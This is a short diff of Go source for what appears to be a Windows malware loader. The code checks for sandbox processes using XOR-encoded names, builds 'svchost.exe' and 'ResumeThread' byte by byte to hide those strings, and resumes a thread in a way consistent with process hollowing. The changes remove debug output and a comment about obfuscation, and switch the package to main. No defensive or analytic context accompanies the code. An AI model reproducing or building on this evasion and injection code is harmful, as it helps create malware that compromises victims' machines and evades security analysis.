@@ -1,8 +1,7 @@
-package percino
+package main
 
 import (
 	"encoding/binary"
-	"fmt"
 	"runtime"
 	"strings"
 	"syscall"
@@ -47,7 +46,6 @@ func IsProcessRunning(processName string) bool {
 }
 
 func CheckSandbox() bool {
-	// change these to xor'd strings, runtime decoded
 	processes := []string{
 		"0327094d270f221b2e1929",
 		"3c390a57261e367d2a022709394b513b08",
@@ -88,7 +86,6 @@ func CheckSandbox() bool {
 		if err != nil {
 			continue
 		}
-		fmt.Println(clearTextProcess)
 		if IsProcessRunning(clearTextProcess) {
 			processSandbox = true
 			break
@@ -127,6 +124,7 @@ func main() {
 		return
 	}
 	zzzh()
+
 	epath := []byte{
 		'C', ':', '\\', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 's', 'v', 'c', 'h', 'o', 's', 't', '.', 'e', 'x', 'e',
 	}
@@ -190,4 +188,5 @@ func main() {
 	})).MustFindProc(string([]byte{
 		'R', 'e', 's', 'u', 'm', 'e', 'T', 'h', 'r', 'e', 'a', 'd',
 	})).Call(uintptr(processInfo.Thread))
+
 }
